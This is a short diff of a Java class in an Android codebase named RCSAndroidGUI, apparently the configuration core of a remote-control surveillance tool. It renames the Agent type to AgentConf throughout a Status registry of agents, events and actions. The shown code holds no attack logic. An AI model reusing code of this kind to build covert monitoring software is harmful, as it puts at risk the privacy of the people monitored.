@@ -13,7 +13,7 @@ import java.util.HashMap;
 import android.content.Context;
 
 import com.ht.RCSAndroidGUI.action.Action;
-import com.ht.RCSAndroidGUI.agent.Agent;
+import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.conf.Option;
 import com.ht.RCSAndroidGUI.event.Event;
 import com.ht.RCSAndroidGUI.utils.Check;
@@ -26,7 +26,7 @@ import com.ht.RCSAndroidGUI.utils.Check;
 public class Status {
 
 	/** The agents map. */
-	private final HashMap<Integer, Agent> agentsMap;
+	private final HashMap<Integer, AgentConf> agentsMap;
 
 	/** The events map. */
 	private final HashMap<Integer, Event> eventsMap;
@@ -53,7 +53,7 @@ public class Status {
 	 * Instantiates a new status.
 	 */
 	private Status() {
-		agentsMap = new HashMap<Integer, Agent>();
+		agentsMap = new HashMap<Integer, AgentConf>();
 		eventsMap = new HashMap<Integer, Event>();
 		actionsMap = new HashMap<Integer, Action>();
 		optionsMap = new HashMap<Integer, Option>();
@@ -113,7 +113,7 @@ public class Status {
 	 * @throws RCSException
 	 *             the rCS exception
 	 */
-	public void addAgent(final Agent a) throws RCSException {
+	public void addAgent(final AgentConf a) throws RCSException {
 		// Don't add the same agent twice
 		if (agentsMap.containsKey(a.getId()) == true) {
 			throw new RCSException("Agent " + a.getId() + " already loaded");
@@ -217,7 +217,7 @@ public class Status {
 	 * 
 	 * @return the agents map
 	 */
-	public HashMap<Integer, Agent> getAgentsMap() {
+	public HashMap<Integer, AgentConf> getAgentsMap() {
 		return agentsMap;
 	}
 
@@ -271,12 +271,12 @@ public class Status {
 	 * @throws RCSException
 	 *             the rCS exception
 	 */
-	public Agent getAgent(final int id) throws RCSException {
+	public AgentConf getAgent(final int id) throws RCSException {
 		if (agentsMap.containsKey(id) == false) {
 			throw new RCSException("Agent " + id + " not found");
 		}
 
-		final Agent a = agentsMap.get(id);
+		final AgentConf a = agentsMap.get(id);
 
 		if (a == null) {
 			throw new RCSException("Agent " + id + " is null");
